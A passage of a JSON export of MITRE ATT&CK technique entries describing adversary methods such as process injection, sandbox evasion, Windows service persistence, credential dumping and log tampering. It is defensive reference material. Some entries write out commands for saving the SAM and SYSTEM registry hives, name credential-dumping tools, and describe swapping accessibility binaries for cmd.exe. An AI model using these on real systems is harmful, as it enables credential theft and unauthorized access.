and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.\", \"modified\": \"2020-06-23T19:03:15.180Z\", \"id\": \"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\"}, \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:47.843Z\", \"name\": \"Process Injection\", \"attack_pattern_identifier\": \"T1055\", \"description\": \"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \\n\\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \\n\\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. \", \"modified\": \"2020-06-20T22:28:45.651Z\", \"id\": \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\"}, \"attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:27.342Z\", \"name\": \"System Network Configuration Discovery\", \"attack_pattern_identifier\": \"T1016\", \"description\": \"Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\\n\\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\", \"modified\": \"2020-03-15T00:55:33.136Z\", \"id\": \"attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0\"}, \"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-04-17T22:22:24.505Z\", \"name\": \"Virtualization/Sandbox Evasion\", \"attack_pattern_identifier\": \"T1497\", \"modified\": \"2020-07-01T16:32:02.272Z\", \"description\": \"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. \\n\\nAdversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)\\n\\n\", \"id\": \"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\"}, \"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-01-10T16:03:18.865Z\", \"name\": \"Create or Modify System Process\", \"attack_pattern_identifier\": \"T1543\", \"description\": \"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. (Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \\n\\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \\n\\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. (Citation: OSX Malware Detection).  \", \"modified\": \"2020-10-09T13:46:29.922Z\", \"id\": \"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\"}, \"attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-24T14:32:40.315Z\", \"name\": \"Accessibility Features\", \"attack_pattern_identifier\": \"T1546.008\", \"description\": \"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\\n\\nTwo common accessibility programs are <code>C:\\\\Windows\\\\System32\\\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\\\Windows\\\\System32\\\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \\\"sticky keys\\\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\\n\\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\\n\\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\\\Windows\\\\System32\\\\utilman.exe</code>) may be replaced with \\\"cmd.exe\\\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\\n\\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\\n\\n* On-Screen Keyboard: <code>C:\\\\Windows\\\\System32\\\\osk.exe</code>\\n* Magnifier: <code>C:\\\\Windows\\\\System32\\\\Magnify.exe</code>\\n* Narrator: <code>C:\\\\Windows\\\\System32\\\\Narrator.exe</code>\\n* Display Switcher: <code>C:\\\\Windows\\\\System32\\\\DisplaySwitch.exe</code>\\n* App Switcher: <code>C:\\\\Windows\\\\System32\\\\AtBroker.exe</code>\", \"modified\": \"2020-05-13T20:37:30.048Z\", \"id\": \"attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5\"}, \"attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:04.307Z\", \"name\": \"System Information Discovery\", \"attack_pattern_identifier\": \"T1082\", \"modified\": \"2020-03-26T18:17:42.298Z\", \"description\": \"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS <code>systemsetup</code> command, but it requires administrative privileges.\\n\\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)\", \"id\": \"attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1\"}, \"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-17T19:13:50.402Z\", \"name\": \"Windows Service\", \"attack_pattern_identifier\": \"T1543.003\", \"description\": \"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075). \\n\\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\\n\\nAn adversary may also incorporate [Masquerading](https://attack.mitre.org/techniques/T1036) by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \\n\\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). \", \"modified\": \"2020-09-16T15:49:58.490Z\", \"id\": \"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\"}, \"attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-02T14:19:22.609Z\", \"name\": \"Data Manipulation\", \"attack_pattern_identifier\": \"T1565\", \"description\": \"Adversaries may insert, delete, or manipulate data in order to manipulate external outcomes or hide activity. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\\n\\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.\", \"modified\": \"2020-03-28T23:16:20.202Z\", \"id\": \"attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931\"}, \"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:00.645Z\", \"name\": \"Valid Accounts\", \"attack_pattern_identifier\": \"T1078\", \"description\": \"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\\n\\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)\", \"modified\": \"2020-10-19T16:01:22.724Z\", \"id\": \"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\"}, \"attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:42:07.281Z\", \"name\": \"Security Account Manager\", \"attack_pattern_identifier\": \"T1003.002\", \"description\": \"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\\n\\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\\n\\n* pwdumpx.exe\\n* [gsecdump](https://attack.mitre.org/software/S0008)\\n* [Mimikatz](https://attack.mitre.org/software/S0002)\\n* secretsdump.py\\n\\nAlternatively, the SAM can be extracted from the Registry with Reg:\\n\\n* <code>reg save HKLM\\\\sam sam</code>\\n* <code>reg save HKLM\\\\system system</code>\\n\\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\\n\\nNotes: \\n* RID 500 account is the local, built-in administrator.\\n* RID 501 is the guest account.\\n* User accounts start with a RID of 1,000+.\\n\", \"modified\": \"2020-03-25T15:17:30.640Z\", \"id\": \"attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011\"}, \"attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-04T12:47:23.631Z\", \"name\": \"Unsecured Credentials\", \"attack_pattern_identifier\": \"T1552\", \"description\": \"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).\", \"modified\": \"2020-10-15T19:39:36.109Z\", \"id\": \"attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517\"}, \"attack-pattern--5909f20f-3c39-4795-be06-ef1ea40d350b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-04-08T17:51:41.390Z\", \"name\": \"Defacement\", \"attack_pattern_identifier\": \"T1491\", \"description\": \"Adversaries may modify visual content available internally or externally to an enterprise network. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages. \\n\", \"modified\": \"2020-04-22T15:19:31.682Z\", \"id\": \"attack-pattern--5909f20f-3c39-4795-be06-ef1ea40d350b\"}, \"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:55.892Z\", \"name\": \"Indicator Removal on Host\", \"attack_pattern_identifier\": \"T1070\", \"description\": \"Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as [Bash History](https://attack.mitre.org/techniques/T1139) and /var/log/*.\\n\\nThese actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.\", \"modified\": \"2020-10-16T18:09:49.074Z\", \"id\": \"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\"}, \"attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:19.735Z\", \"name\": \"OS Credential Dumping\", \"attack_pattern_identifier\": \"T1003\", \"description\": \"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\\n\\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\\n\", \"modified\": \"2020-06-09T20:46:00.758Z\", \"id\": \"attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22\"}, \"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:08.479Z\", \"name\": \"Proxy\", \"attack_pattern_identifier\": \"T1090\", \"description\": \"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\\n\\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.\", \"modified\": \"2020-10-21T17:54:28.531Z\", \"id\": \"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\"}, \"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T13:48:55.078Z\", \"name\": \"PowerShell\", \"attack_pattern_identifier\": \"T1059.001\", \"modified\": \"2020-06-24T13:51:22.360Z\", \"description\": \"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\\n\\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\\n\\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\\n\\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)\", \"id\": \"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\"}, \"attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:29.858Z\", \"name\": \"Remote Services\", \"attack_pattern_identifier\": \"T1021\", \"modified\": \"2020-03-25T12:25:03.251Z\", \"description\": \"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\\n\\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)\", \"id\": \"attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba\"}, \"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-12-14T16:46:06.044Z\", \"name\": \"Deobfuscate/Decode Files or Information\", \"attack_pattern_identifier\": \"T1140\", \"description\": \"Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\\n\\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\\n\\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)\", \"modified\": \"2020-07-09T14:42:23.122Z\", \"id\": \"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\"}, \"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-31T12:42:44.103Z\", \"name\": \"Timestomp\", \"attack_pattern_identifier\": \"T1070.006\", \"modified\": \"2020-03-29T21:39:46.724Z\", \"description\": \"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\\n\\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)\", \"id\": \"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\"}, \"attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-16T15:33:01.739Z\", \"name\": \"Encrypted Channel\", \"attack_pattern_identifier\": \"T1573\", \"modified\": \"2020-03-30T00:37:16.809Z\", \"description\": \"Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.\", \"id\": \"attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118\"}, \"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:49.546Z\", \"name\": \"Command and Scripting Interpreter\", \"attack_pattern_identifier\": \"T1059\", \"description\": \"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript/JScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\\n\\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.\", \"modified\": \"2020-10-22T16:43:39.362Z\", \"id\": \"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\"}, \"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:10.728Z\", \"name\": \"Non-Application Layer Protocol\", \"attack_pattern_identifier\": \"T1095\", \"modified\": \"2020-10-21T19:41:49.412Z\", \"description\": \"Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\\n\\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution)\\n Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\", \"id\": \"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\"}, \"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-06T20:57:37.959Z\", \"name\": \"System Checks\", \"attack_pattern_identifier\": \"T1497.001\", \"description\": \"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. \\n\\nSpecific checks may will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \\n\\nChecks could include generic system properties such as uptime and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \\n\\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \\n \\nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)\", \"modified\": \"2020-07-01T16:32:02.514Z\", \"id\": \"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\"}, \"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-15T16:13:46.151Z\", \"name\": \"Web Protocols\", \"attack_pattern_identifier\": \"T1071.001\", \"description\": \"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. \", \"modified\": \"2020-03-26T20:15:35.821Z\", \"id\": \"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\"}, \"attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-13T21:13:10.467Z\", \"name\": \"Local Data Staging\", \"attack_pattern_identifier\": \"T1074.001\", \"modified\": \"2020-05-26T19:23:54.854Z\", \"description\": \"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\", \"id\": \"attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c\"}, \"attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-19T18:46:06.098Z\", \"name\": \"Local Email Collection\", \"attack_pattern_identifier\": \"T1114.001\", \"modified\": \"2020-03-24T17:59:20.983Z\", \"description\": \"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\\u2019s local system, such as Outlook storage or cache files.\\n\\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\\\Users\\\\<username>\\\\Documents\\\\Outlook Files` or `C:\\\\Users\\\\<username>\\\\AppData\\\\Local\\\\Microsoft\\\\Outlook`.(Citation: Microsoft Outlook Files)\", \"id\": \"attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004\"}, \"attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-06-28T17:52:07.296Z\", \"name\": \"Server Software Component\", \"attack_pattern_identifier\": \"T1505\", \"description\": \"Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.\", \"modified\": \"2020-09-16T19:34:19.961Z\", \"id\": \"attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb\"}, \"attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-20T21:01:25.428Z\", \"name\": \"Archive via Utility\", \"attack_pattern_identifier\": \"T1560.001\", \"modified\": \"2020-03-25T21:54:37.374Z\", \"description\": \"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip(Citation: 7zip Homepage), WinRAR(Citation: WinRAR Homepage), and WinZip(Citation: WinZip Homepage). Most utilities include functionality to encrypt and/or compress data.\\n\\nSome 3rd party utilities may be preinstalled, such as `tar` on Linux and macOS or `zip` on Windows systems.\", \"id\": \"attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662\"}, \"attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-13T18:11:08.357Z\", \"name\": \"DLL Search Order Hijacking\", \"attack_pattern_identifier\": \"T1574.001\", \"modified\": \"2020-03-26T16:13:58.862Z\", \"description\": \"Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order) Hijacking DLL 